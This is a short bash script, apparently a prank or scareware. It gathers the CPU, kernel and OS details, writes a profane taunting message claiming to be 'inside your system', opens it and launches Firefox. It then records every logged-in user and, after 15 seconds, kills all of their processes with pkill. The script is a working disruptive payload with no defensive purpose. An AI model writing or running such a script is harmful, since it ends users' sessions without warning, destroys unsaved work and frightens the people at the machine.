#!/bin/bash


CPU=$(grep "model name" /proc/cpuinfo | head -1 | awk -F: '{print $2}' | xargs)
KERNEL=$(awk '{print $3}' /proc/version)
OS=$(grep "PRETTY_NAME" /etc/os-release | cut -d= -f2 | tr -d '"')

touch you.txt
{
	echo -e "Hi buddy, I'm inside your system.\nDon't Believe Me?\n" 
	echo -e "Well you have a $CPU, and you're running a current version of $OS, specifically $KERNEL\n" 
	echo -e "So you think you're hot shit??? Fuck outta here"
} >> you.txt
xdg-open you.txt & 

firefox &

touch youdos.txt
who | awk '{print $1}' >> youdos.txt

sleep 15
awk '{print $1}' youdos.txt | xargs -I {} pkill -u {}



